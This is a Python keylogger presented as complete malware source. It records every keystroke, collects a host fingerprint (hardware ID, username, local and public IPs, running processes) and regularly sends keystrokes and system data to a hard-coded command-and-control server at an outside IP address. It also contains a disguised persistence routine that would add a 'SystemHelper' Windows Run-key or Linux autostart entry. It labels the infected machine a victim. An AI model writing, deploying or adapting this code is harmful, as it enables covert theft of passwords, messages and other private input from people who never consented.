from pynput import keyboard
import requests
import threading
import time
import platform
import subprocess
import hashlib
import os
import socket

C2_URL = "https://13.61.176.16:8443/log"
PING_URL = "https://13.61.176.16:8443/ping"





HOSTNAME = platform.node()

def get_hwid():
    """Return a hardware ID unique per machine, cross-platform."""
    try:
        system = platform.system()
        if system == "Linux":
            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
                if os.path.exists(path):
                    with open(path) as f:
                        raw = f.read().strip()
                        return hashlib.sha256(raw.encode()).hexdigest()[:16]
            return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

        elif system == "Windows":
            try:
                raw = subprocess.check_output(
                    ["powershell", "-Command",
                     "Get-CimInstance Win32_DiskDrive | Select-Object -First 1 -ExpandProperty SerialNumber"],
                    text=True, timeout=5
                ).strip()
            except Exception:
                raw = subprocess.check_output(
                    ["powershell", "-Command",
                     "(Get-Volume -DriveLetter C).SerialNumber"],
                    text=True, timeout=5
                ).strip()
            if raw:
                return hashlib.sha256(raw.encode()).hexdigest()[:16]

        return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

    except Exception:
        return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

HWID = get_hwid()

def gather_system_info():
    info = {}
    info["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
    info["architecture"] = platform.machine()
    info["username"] = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    info["local_ip"] = socket.gethostbyname(socket.gethostname())

    try:
        info["public_ip"] = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        info["public_ip"] = "unknown"

    try:
        if platform.system() == "Windows":
            output = subprocess.check_output(
                ["powershell", "-Command",
                 "Get-Process | Select-Object -First 20 -ExpandProperty ProcessName"],
                text=True, timeout=5
            )
        else:
            output = subprocess.check_output(
                ["ps", "--no-headers", "-eo", "comm"],
                text=True, timeout=5
            )[:500]
        info["processes"] = output.strip()
    except Exception:
        info["processes"] = "unknown"

    return info

SYSTEM_INFO = gather_system_info()

buffer = []
lock = threading.Lock()
first_beacon = True

def beacon():
    global buffer, first_beacon
    last_ping_ts = 0

    while True:
        time.sleep(5)
        now = time.time()

        with lock:
            has_data = len(buffer) > 0
            data = "".join(buffer)
            buffer = []
            send_info = first_beacon
            first_beacon = False

        payload = {"k": data, "hostname": HOSTNAME, "hwid": HWID}

        if send_info:
            payload["first_contact"] = "1"
            payload["os"] = SYSTEM_INFO["os"]
            payload["arch"] = SYSTEM_INFO["architecture"]
            payload["username"] = SYSTEM_INFO["username"]
            payload["local_ip"] = SYSTEM_INFO["local_ip"]
            payload["public_ip"] = SYSTEM_INFO["public_ip"]
            payload["processes"] = SYSTEM_INFO["processes"]

        try:
            if has_data or send_info:
                # Send log data
                requests.post(C2_URL, data=payload, verify=False, timeout=5)
                last_ping_ts = now
            elif (now - last_ping_ts) >= 30:
                # Nothing to log, just send a heartbeat
                requests.post(PING_URL, data={"hostname": HOSTNAME, "hwid": HWID},
                              verify=False, timeout=5)
                last_ping_ts = now
        except Exception:
            pass

def on_press(key):
    with lock:
        try:
            buffer.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                buffer.append(" ")
            else:
                key_str = str(key).replace("Key.", "")
                buffer.append(f" [{key_str}] ")

# --- Persistence (runs once at startup) ---
def install_persistence():
    """Add this script to startup so it runs after reboot.
    Works for both .py scripts and PyInstaller .exe builds.
    """
    try:
        system = platform.system()
        if system == "Windows":
            # --- Get the actual executable path ---
            if getattr(sys, 'frozen', False):
                # Running as PyInstaller .exe
                exe_path = sys.executable  # Full path to the .exe
            else:
                # Running as plain .py script
                script_path = os.path.abspath(__file__)
                pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
                exe_path = f'"{pythonw}" "{script_path}"' if os.path.exists(pythonw) else f'"{sys.executable}" "{script_path}"'

            key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
            subprocess.run(
                ["reg", "add", key, "/v", "SystemHelper", "/t", "REG_SZ",
                 "/d", f'"{exe_path}"', "/f"],
                capture_output=True, timeout=10
            )
            print(f"[PERSISTENCE] Added to HKCU\\Run: {exe_path}")

        elif system == "Linux":
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_path = os.path.join(autostart_dir, "system-helper.desktop")

            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = f"python3 {os.path.abspath(__file__)}"

            with open(desktop_path, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec={exe_path}
X-GNOME-Autostart-enabled=true
""")
            print(f"[PERSISTENCE] Created autostart entry: {desktop_path}")

    except Exception as e:
        print(f"[PERSISTENCE] Failed: {e}")

# install_persistence()

t = threading.Thread(target=beacon, daemon=True)
t.start()

print(f"[VICTIM] Started — Hostname: {HOSTNAME}, HWID: {HWID}")
print(f"[VICTIM] Logging to: {C2_URL}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()